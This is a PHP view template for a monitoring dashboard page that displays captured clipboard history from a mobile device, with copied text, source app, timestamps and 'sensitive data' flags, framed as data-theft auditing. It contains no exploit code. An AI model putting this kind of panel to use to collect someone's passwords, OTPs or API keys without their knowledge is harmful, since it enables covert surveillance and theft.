<?php /** @var array $rows @var int $total @var object $pager @var string $nav_urls */ ?>
<style>
.clip-card { border-radius: 10px; background: #fff; border: 1px solid #eef2f5; box-shadow: 0 2px 8px rgba(0,0,0,0.04); margin-bottom: 16px; overflow: hidden; }
.clip-badge-sensitive { background: #fef2f2; border: 1px solid #fee2e2; color: #ef4444; border-radius: 6px; padding: 2px 8px; font-size: 11px; font-weight: bold; }
.clip-badge-normal { background: #f3f4f6; border: 1px solid #e5e7eb; color: #4b5563; border-radius: 6px; padding: 2px 8px; font-size: 11px; font-weight: bold; }
.clip-source { font-size: 11px; font-family: monospace; color: #6b7280; background: #f9fafb; border-radius: 4px; padding: 2px 6px; }
.clip-pre { background: #1e293b; color: #f8fafc; font-family: 'Courier New', Courier, monospace; padding: 12px; border-radius: 6px; max-height: 120px; overflow-y: auto; white-space: pre-wrap; font-size: 12px; }
.timeline-item-custom { position: relative; padding-left: 30px; margin-bottom: 24px; }
.timeline-item-custom::before { content: ''; position: absolute; left: 10px; top: 0; bottom: -24px; width: 2px; background: #e2e8f0; }
.timeline-item-custom:last-child::before { display: none; }
.timeline-dot { position: absolute; left: 5px; top: 0; width: 12px; height: 12px; border-radius: 50%; background: #3b82f6; border: 2px solid #fff; }
</style>

<div class="content-wrapper">
    <section class="content-header">
        <div class="container-fluid">
            <div class="row mb-3 align-items-center">
                <div class="col-lg-7">
                    <h1 class="h2 mb-0"><i class="fas fa-clipboard text-primary mr-2"></i>Clipboard History</h1>
                    <p class="text-muted mt-1 mb-0">Captured clipboard operations, copied texts, and source applications</p>
                </div>
                <div class="col-lg-5 text-right"><?= $nav_urls ?></div>
            </div>

            <!-- Callout -->
            <div class="callout callout-danger shadow-sm p-3 mb-4" style="border-left:5px solid #dc3545; background:#fff5f5;">
                <h5 class="font-weight-bold text-danger"><i class="fas fa-user-shield mr-2"></i>Data Theft Risk Auditing</h5>
                <p class="text-secondary mb-0" style="font-size:14px;">Clipboard data is frequently harvested by background processes. Inspecting copy patterns reveals if passwords, banking OTPs, or private API keys are leaking.</p>
            </div>
        </div>
    </section>

    <section class="content">
        <div class="container-fluid">
            <?php if (empty($rows)): ?>
                <div class="text-center py-5">
                    <i class="fas fa-clipboard fa-3x text-muted mb-3"></i>
                    <h4 class="text-secondary">No Clipboard Data Captured</h4>
                    <p class="text-muted">Copied clips will populate here once captured.</p>
                </div>
            <?php else: ?>
                <div class="row">
                    <div class="col-12">
                        <?php foreach ($rows as $r):
                            if (empty($r['clip_text'])) continue;
                            $sensitive = !empty($r['is_sensitive']);
                            $ts = !empty($r['timestamp']) ? format_timestamp_display((int)$r['timestamp']) : (!empty($r['extracted_at']) ? format_timestamp_display((int)$r['extracted_at']) : '—');
                            $rid = $r['id'] ?? 0;
                            ?>
                            <div class="timeline-item-custom">
                                <div class="timeline-dot" style="background: <?= $sensitive ? '#ef4444' : '#3b82f6' ?>;"></div>
                                <div class="clip-card">
                                    <div class="bg-light p-3 d-flex align-items-center justify-content-between flex-wrap">
                                        <div class="d-flex align-items-center flex-wrap">
                                            <span class="badge badge-primary mr-2"><i class="fas fa-tag mr-1"></i><?= esc($r['clip_data_type'] ?: 'Text') ?></span>
                                            <span class="clip-source mr-2"><i class="fas fa-mobile-alt mr-1"></i>Source: <?= esc($r['source_package'] ?: 'Unknown App') ?></span>
                                            <?php if ($r['label']): ?>
                                                <span class="badge badge-light border text-muted mr-2">Label: <?= esc($r['label']) ?></span>
                                            <?php endif; ?>
                                        </div>
                                        <div class="d-flex align-items-center mt-2 mt-md-0">
                                            <span class="mr-2 <?= $sensitive ? 'clip-badge-sensitive' : 'clip-badge-normal' ?>">
                                                <i class="fas <?= $sensitive ? 'fa-exclamation-triangle' : 'fa-lock' ?> mr-1"></i>
                                                <?= $sensitive ? 'SENSITIVE DATA' : 'Standard' ?>
                                            </span>
                                            <small class="text-muted"><i class="fas fa-clock mr-1"></i><?= $ts ?></small>
                                            
                                            <button class="btn btn-xs btn-outline-danger delete-row ml-3"
                                                    data-id="<?= $rid ?>"
                                                    data-url="<?= base_url('advanced/software/clipboard/delete') ?>"
                                                    title="Delete this entry">
                                                <i class="fas fa-trash"></i>
                                            </button>
                                        </div>
                                    </div>
                                    <div class="p-3 bg-light border-top">
                                        <div class="clip-pre" style="background: #0f172a; border-left: 4px solid <?= $sensitive ? '#ef4444' : '#3b82f6' ?>;"><?= esc($r['clip_text']) ?></div>
                                        
                                        <?php if ($r['clip_html'] || $r['clip_uri']): ?>
                                            <div class="mt-3 pt-3 border-top small text-muted">
                                                <?php if ($r['clip_html']): ?>
                                                    <div class="mb-1"><b class="text-secondary">HTML Content:</b> <code><?= esc($r['clip_html']) ?></code></div>
                                                <?php endif; ?>
                                                <?php if ($r['clip_uri']): ?>
                                                    <div><b class="text-secondary">URI Content:</b> <code><?= esc($r['clip_uri']) ?></code></div>
                                                <?php endif; ?>
                                            </div>
                                        <?php endif; ?>
                                    </div>
                                </div>
                            </div>
                        <?php endforeach; ?>
                        
                        <div class="mt-3">
                            <?= $pager->links('default', 'bootstrap5_full') ?>
                        </div>
                    </div>
                </div>
            <?php endif; ?>
        </div>
    </section>
</div>
<?php include __DIR__ . '/_adv_style.php'; ?>
<?php include __DIR__ . '/_adv_delete_script.php'; ?>
